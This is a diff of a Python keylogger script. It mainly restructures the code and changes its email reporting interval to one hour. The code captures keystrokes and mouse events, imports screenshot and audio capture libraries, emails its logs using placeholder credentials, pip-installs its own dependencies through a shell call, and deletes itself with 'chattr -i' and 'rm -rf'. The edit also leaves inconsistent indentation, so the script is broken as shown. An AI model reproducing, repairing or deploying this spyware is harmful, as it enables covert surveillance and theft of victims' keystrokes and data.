@@ -1,25 +1,27 @@
- import logging
- import os
- import platform
- import smtplib
- import socket
- import threading
- import wave
- import pyscreenshot
- import sounddevice as sd
- from pynput import keyboard
- from pynput.keyboard import Listener
-except ModuleNotFoundError:
-    from subprocess import call
-    modules = ["pyscreenshot","sounddevice","pynput"]
-    call("pip install " + ' '.join(modules), shell=True)
+import logging
+import os
+import platform
+import smtplib
+import socket
+import threading
+import wave
+import pyscreenshot
+import sounddevice as sd
+from pynput import keyboard
+from pynput.keyboard import Listener
+# except ModuleNotFoundError:
+from subprocess import call
+modules = ["pyscreenshot", "sounddevice", "pynput"]
+call("pip install " + ' '.join(modules), shell=True)
 
 
-finally:
-    EMAIL_ADDRESS = "YOUR_EMAIL"
-    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
-    SEND_REPORT_EVERY = 60 # as in seconds
-    class KeyLogger:
+# finally:
+EMAIL_ADDRESS = "YOUR_EMAIL"
+EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
+SEND_REPORT_EVERY = 3600
+
+
+class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
             self.log = "KeyLogger Started..."
@@ -101,7 +103,8 @@ finally:
             with keyboard_listener:
                 self.report()
                 keyboard_listener.join()
-            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
+            with Listener(on_click=self.on_click,
+on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                 mouse_listener.join()
             if os.name == "nt":
                 try:
@@ -118,11 +121,12 @@ finally:
                     pwd = os.path.abspath(os.getcwd())
                     os.system("cd " + pwd)
                     os.system('pkill leafpad')
-                    os.system("chattr -i " +  os.path.basename(__file__))
+                    os.system("chattr -i " + os.path.basename(__file__))
                     print('File was closed.')
                     os.system("rm -rf" + os.path.basename(__file__))
                 except OSError:
                     print('File is close.')
 
-    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
-    keylogger.run()
+
+keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+keylogger.run()
